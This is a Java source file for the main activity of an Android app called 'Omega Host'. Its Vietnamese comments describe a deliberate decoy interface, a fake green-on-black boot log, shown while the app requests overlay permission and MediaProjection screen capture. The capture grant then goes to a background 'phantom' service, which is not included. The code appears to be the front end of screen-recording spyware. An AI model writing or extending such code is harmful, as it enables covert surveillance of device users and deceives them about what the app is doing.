package com.omega.host;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.TextView;

public class MainActivity extends Activity {

    private TextView tv;
    private static final int OVERLAY_PERMISSION_REQ_CODE = 1001;
    private static final int MEDIA_PROJECTION_REQ_CODE = 1002;

    // 1. ĐIỂM KỲ DỊ (ONCREATE) - NƠI HỆ THỐNG THỨC TỈNH
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Khởi tạo Giao diện Giả mạo (Decoy UI)
        tv = new TextView(this);
        tv.setBackgroundColor(Color.BLACK);
        tv.setTextColor(Color.GREEN);
        tv.setTextSize(14f);
        tv.setPadding(50, 50, 50, 50);
        tv.setGravity(Gravity.START);
        setContentView(tv);

        appendLog("[SYSTEM] Omega Host Boot Sequence Initiated...");
        appendLog("[STATUS] Checking Kernel Permissions...");

        // 2. XIN QUYỀN VẼ LỚP PHỦ (OVERLAY / SYSTEM_ALERT_WINDOW)
        if (!Settings.canDrawOverlays(this)) {
            appendLog("[ACTION] Requesting Overlay Permission...");
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
        } else {
            requestScreenCapture();
        }
    }

    // 3. KÍCH HOẠT BẪY QUANG HỌC (MEDIA PROJECTION)
    private void requestScreenCapture() {
        appendLog("[ACTION] Requesting Optical Capture (MediaProjection)...");
        MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mgr.createScreenCaptureIntent(), MEDIA_PROJECTION_REQ_CODE);
    }

    // 4. CỔNG ĐÓN NHẬN PHẢN HỒI TỪ HỆ ĐIỀU HÀNH
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_PERMISSION_REQ_CODE) {
            if (Settings.canDrawOverlays(this)) {
                appendLog("[SUCCESS] Overlay Permission Granted.");
                requestScreenCapture();
            } else {
                appendLog("[CRITICAL] Overlay Permission Denied. System Halted.");
            }
        } else if (requestCode == MEDIA_PROJECTION_REQ_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                appendLog("[SUCCESS] Optical Trap Authorized.");
                appendLog("[SYNC] Handing over to OpticalPhantomService...");
                
                // Chuyển giao quyền kiểm soát cho Service ngầm (Tránh lỗi Parcelable Intent)
                OpticalPhantomService.mResultCode = resultCode;
                OpticalPhantomService.mResultIntent = data;
                
                // Khởi động Service Bóng Ma
                Intent serviceIntent = new Intent(this, OpticalPhantomService.class);
                startForegroundService(serviceIntent);
                
                appendLog("[STATUS] OMEGA HOST: ONLINE. RETINA SYNCING...");
            } else {
                appendLog("[CRITICAL] Screen Capture Denied. System Halted.");
            }
        }
    }

    // Hàm phụ trợ đẩy log lên màn hình
    private void appendLog(String msg) {
        if (tv != null) {
            tv.append(msg + "\n");
        }
    }
}